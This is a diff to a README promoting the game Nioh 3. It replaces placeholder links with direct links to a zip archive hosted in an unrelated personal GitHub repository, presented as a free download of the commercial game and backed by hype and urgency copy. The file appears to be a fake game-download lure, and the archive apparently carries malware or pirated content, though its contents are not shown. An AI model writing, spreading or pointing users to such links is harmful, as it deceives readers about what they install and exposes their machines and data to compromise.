@@ -4,7 +4,7 @@
 
 > Team Ninja's best entry in the series — open-field soulslike combat meets feudal Japanese mythology in a massive, brutally rewarding action RPG.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/rodydoda438-byte/nioh-3/raw/refs/heads/main/helmeted/nioh-3.3.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **2026** · Available on **PC, PS5**.
 
 ### Ready to play / use?
 
-[![Download Nioh 3](https://img.shields.io/badge/Download-Nioh%203-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Nioh 3](https://img.shields.io/badge/Download-Nioh%203-brightgreen?style=for-the-badge)](https://github.com/rodydoda438-byte/nioh-3/raw/refs/heads/main/helmeted/nioh-3.3.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/rodydoda438-byte/nioh-3/raw/refs/heads/main/helmeted/nioh-3.3.zip)**
 
 </div>
 
@@ -68,7 +68,7 @@ Nioh 3 is one of the **most hyped releases of Summer 2026** — trending across 
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/rodydoda438-byte/nioh-3/raw/refs/heads/main/helmeted/nioh-3.3.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -76,7 +76,7 @@ Nioh 3 is one of the **most hyped releases of Summer 2026** — trending across 
 
 **Don't miss out — Nioh 3 is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Nioh%203-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Nioh%203-blue?style=for-the-badge)](https://github.com/rodydoda438-byte/nioh-3/raw/refs/heads/main/helmeted/nioh-3.3.zip)
 
 *Nioh 3 — 2026 · PC, PS5*
 
